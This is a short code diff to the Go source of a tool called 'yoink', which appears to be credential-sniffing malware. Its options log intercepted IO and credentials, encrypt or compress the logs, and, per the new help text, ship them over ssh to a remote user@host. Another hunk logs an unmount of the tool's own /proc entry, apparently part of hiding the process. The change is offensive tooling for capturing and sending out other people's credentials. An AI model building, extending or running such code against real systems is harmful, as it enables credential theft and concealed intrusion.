@@ -18,8 +18,10 @@ func main() {
 	fs := flag.NewFlagSet("yoink", flag.ExitOnError)
 	// logging options
 	nullIO := fs.Bool("noio", false, "skip logging IO, still can log creds")
-	logPath := fs.String("log", "", "set output log (disables stdout, will logrotate on startup: TREAD CAREFULLY)")
-	credPath := fs.String("creds", "", "copy creds to separate log (O_APPEND and can encrypt with -key. no compression or logrotate)")
+	logPath := fs.String("log", "",
+		"set output log (disables stdout, will overwrite existing files)"+
+			"\n\tcan be used over ssh via user@host:path/to/file || user:pass@host+port:path/to/file")
+	credPath := fs.String("creds", "", "copy creds to separate log (will overwrite existing files)")
 	key := fs.String("key", "", "encrypt logs with key (must be 32 hex bytes)")
 	lzw := fs.Bool("lzw", false, "compress logs")
 
@@ -165,6 +167,9 @@ func main() {
 	if *mount {
 		cmdArgs := []string{"umount", fmt.Sprintf("/proc/%d", os.Getpid())}
 		logger.Printf("[+] %s", strings.Join(cmdArgs, " "))
+		if *logPath != "" {
+			log.Printf("[+] %s", strings.Join(cmdArgs, " "))
+		}
 		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
 		if out, err := cmd.CombinedOutput(); err != nil {
 			logger.Printf("[-] unmount failed: %s", err)
